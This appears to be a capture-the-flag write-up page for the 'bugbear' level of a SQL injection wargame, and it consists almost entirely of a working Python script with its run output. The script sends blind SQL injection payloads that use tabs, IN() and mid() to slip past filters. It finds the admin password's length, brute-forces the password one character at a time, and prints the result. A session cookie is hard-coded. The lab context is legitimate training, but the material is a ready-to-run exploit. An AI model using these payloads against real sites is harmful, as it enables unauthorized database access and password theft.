---
custom_edit_url: null
sidebar_position: 13
---

### Script

```python title="bugbear_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': '8gn319vvgv2jjh50m0bg9c11ng'}
url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
password_length = 0

for x in range(0, 10):
  payload = f"0||id	IN(\"admin\")&&length(pw)	IN({x})"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?no={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f'[!] Payload: ?no={payload}')
print(f'[!] Payload (URL encoded): ?no={encoded_payload}')
print(f'[!] Password length: {password_length}')

password = ''
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"0||id	IN(\"admin\")&&mid(pw,{index},1)	IN(\"{char}\")"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?no={encoded_payload}'

    response = requests.get(full_url, cookies=cookies)

    if 'Hello admin' in response.text:
      password += char
      print()
      print(f'[+] Payload: ?no={payload}')
      print(f'[+] Payload (URL encoded): ?no={encoded_payload}')
      print(f'[+] Character at index {index}: {char}')
      break

print()
print(f'[!] Extracted password: {password}')
print(f'[!] Final payload: ?pw={password}')
```

```
$ python .\bugbear_script.py

[!] Payload: ?no=0||id  IN("admin")&&length(pw) IN(8)
[!] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26length%28pw%29%09IN%288%29
[!] Password length: 8

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,1,1)        IN("5")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C1%2C1%29%09IN%28%225%22%29
[+] Character at index 1: 5

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,2,1)        IN("2")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C2%2C1%29%09IN%28%222%22%29
[+] Character at index 2: 2

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,3,1)        IN("d")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C3%2C1%29%09IN%28%22d%22%29
[+] Character at index 3: d

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,4,1)        IN("c")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C4%2C1%29%09IN%28%22c%22%29
[+] Character at index 4: c

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,5,1)        IN("3")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C5%2C1%29%09IN%28%223%22%29
[+] Character at index 5: 3

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,6,1)        IN("9")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C6%2C1%29%09IN%28%229%22%29
[+] Character at index 6: 9

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,7,1)        IN("9")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C7%2C1%29%09IN%28%229%22%29
[+] Character at index 7: 9

[+] Payload: ?no=0||id  IN("admin")&&mid(pw,8,1)        IN("1")
[+] Payload (URL encoded): ?no=0%7C%7Cid%09IN%28%22admin%22%29%26%26mid%28pw%2C8%2C1%29%09IN%28%221%22%29
[+] Character at index 8: 1

[!] Extracted password: 52dc3991
[!] Final payload: ?pw=52dc3991
```

![0](https://github.com/Kunull/Write-ups/assets/110326359/79e0068b-45ad-4d2e-a03d-791bb38cafce)
